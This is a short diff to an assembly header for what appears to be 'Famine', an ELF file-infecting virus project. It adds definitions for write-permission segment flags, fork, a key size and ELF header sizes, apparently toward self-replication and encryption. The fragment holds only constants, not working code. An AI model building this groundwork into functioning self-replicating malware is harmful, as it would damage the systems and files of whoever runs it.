@@ -7,8 +7,9 @@
 %define	SEGMENT_TYPE	0x0000000000000004
 %define PF_R			0x4
 %define	PF_X			0x1
+%define PF_W			0x2
 
-%define	_write			18
+%define	_pwrite			18
 %define	_exit			60
 %define	_open			2
 %define	_close			3
@@ -19,6 +20,7 @@
 %define	_chmod			90
 %define _lseek			8
 %define _sync			162
+%define _fork			0x39
 
 ; File acces
 %define	O_RDONLY			0o0000000
@@ -34,13 +36,14 @@
 %define	MAP_SHARED 			0x01
 %define	MMAP_ERRORS			-4095
 
-
 ; Famine
 %define FAMINE_SIZE			(_end - _start)
+%define KEY_SIZE			5
 %define STACK(x)			[(rbp - famine_size) + x]
 %define	DIRENT_ARR_SIZE		1024
 %define JMP					0xe9
-
+%define EHDR_SIZE			64
+%define PHDR_SIZE			56
 
 ; MACROS
 %macro PUSH 0
@@ -80,7 +83,7 @@
 	pop rax
 %endmacro
 
-;Strucs
+;Structures
 
 	struc	dirent
 .d_ino:			resq	1	; 64-bit inode number
